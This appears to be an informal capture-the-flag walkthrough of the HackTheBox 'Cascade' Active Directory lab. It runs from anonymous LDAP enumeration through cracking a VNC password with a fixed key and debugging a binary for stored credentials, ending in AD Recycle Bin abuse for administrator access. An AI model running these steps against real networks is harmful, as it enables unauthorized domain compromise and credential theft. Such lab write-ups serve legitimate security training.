# Recon
```
└─$ nmap -sC -sV 10.10.10.182 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 08:38 EEST
Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 08:39 (0:00:00 remaining)
Nmap scan report for 10.10.10.182
Host is up (0.14s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-09 04:38:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.25 seconds                                                     
```
- OS as Windows Server 2008 SP1, which is old and no longer supported
- WinRM (TCP 5985) open
- now we check smb with crackmapexec smbmap and smbclient
- no luck wit smb no workgroup available
- we check rpc and it allows anonymous access
```
─$ rpcclient -U "" -N 10.10.10.182
rpcclient $> 
```
- run querydispinfo but no creds in the description
- i listed domainusers and groups and gone to check ldap first get the namin context
```
$ ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                        
```
- dump all to a file and get just the people
```
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people
```
- after searching for any intersting info user ryan had different row at the end of ldap search
```
cascadeLegacyPwd: clk0bjVldmE=
```
- i guess its a password and it has = at its end so maybe its base64 so decode it
```
echo clk0bjVldmE= | base64 -d
rY4n5eva  
```
- now try crackmapexec at winrm and smb
  i stuck with how the user is spelled i tryed ryan didnt work Ryan Thompson also didnt work so i go back to rpc for the users and the user is r.thompson
- winrm showe no response but smb did
```
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

```
- smbmap shows the same
```
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva -M spider_plus
```
- the command above crawls everyshare we has access to and gives json output
```
jq .[] 10.10.10.182.json
```
- to view file in coloring
- i see this file "IT/Temp/s.smith/VNC Install.reg" which sound intersting because we are in ryan directory
- so lets first mount the files like ippsec did in the video
```
cd Desktop
mkdir mnt/data/
cd mnt/data/
sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/data .
```
- after waiting a minute we got the shares
- we can skip the moungting and just use thisafter connecting with smbclient
- ```
  smbclient --user r.thompson //10.10.10.182/data rY4n5eva
  ```
```
mask ""
recurse ON
prompt OFF
mget *
```
- after downloading the files we just
```
find smb-data-loot/ -type f
```
- nice list of the files
- Meeting_Notes_June_2018.html presents like an email after reading it we need to keep an eye out for the admin account password and TempAdmin.
- file "IT/Temp/s.smith/VNC Install.reg" after reading it we found a password in hex but after cracking it no password was given so we search for tightvnc password decrypt and found a way using msfconsole
```
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>> 
                
```
- we have password with user s.smith since it is his directory now we can try winrm  and we got a shell and user flag on desktop
# Priv Esc 
- run whoami /all to see what we have access to
- i see audit group but also run
```
*Evil-WinRM* PS C:\Users\s.smith\desktop> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
- we see audit share and it groups
```
*Evil-WinRM* PS C:\Users\s.smith\desktop> net localgroup "Audit Share"
Alias name     Audit Share
Comment        \\Casc-DC1\Audit$

Members

-------------------------------------------------------------------------------
s.smith
The command completed successfully.

```
- there is a comment
- we can use crackmapexec with spiderplus like above to enumrate all shares as ippsec did
- There’s a c:\shares\, but I don’t have permissions to list the directories in it we can go into Audit based on the share name in the comment
- copy all the files to my local VM
```
sudo mount -t cifs -o 'user=s.smith,password=sT333ve2' //10.10.10.182/audit$ .
```
- first i check the folder db and dound audit.db and i used command file to know its a sqlite3 so
```
sqlite3 Audit.db .dump
```
- and i see cred and password in base 64 we crack it and we have  creds but we have no luck logging in with crackmapexec or winrm
- the base64-encoded data didn’t decode to ASCII. Perhaps it’s encrypted somehow
- we have exe and dll and bat
- we cat the bat file and
```
─$ cat RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db" 
```
- we need to run the exe with the db
- we head to window machine and copy all files with smb server
```
──(kali㉿kali)-[~/mnt]
└─$ impacket-smbserver share .
find ip of eth0
ifconfig eth0
go to run command in windows and type
\\eth0\share 
```
- and we can access the share
- copy all files to local windows and open dnspy with the dll after readng the code
- opening an SQLite connection to the database passed as an arg, reading from the LDAP table, and decrypting the password
- decided to recover the plaintext password by debugging
- so we open the exe on dnspe and find where the crypto command happens
- we set a breakpoint on the password line in the code and run it and set the Arugument to where I had a copy of Audit.db and start depugging
- hitting ok and pressing f10 we see the password
```
"w3lc0meFr31nd\0\0\0"
```
- so we have password  and username from reading the audit.db
- arksvc:w3lc0meFr31nd
- we try evilwinrm and we got a shell
- run net user arksvc and we see intersting group (  *AD Recycle Bin)
- searched for exploit for the group and dound command on hacktricks
```
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
- this  query all of the deleted objects within a domain
- we see tempadmin deleted so we run
```
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```
- and we see cascadeleagcypwd
- so crack it using base64
```
└─$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```
- and we got creds user tempadmin and password baCT3r1aN00dles we try evilwinrm but no luck
- i try with user administrator and we got ashell as administrator
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
cascade\administrator
```
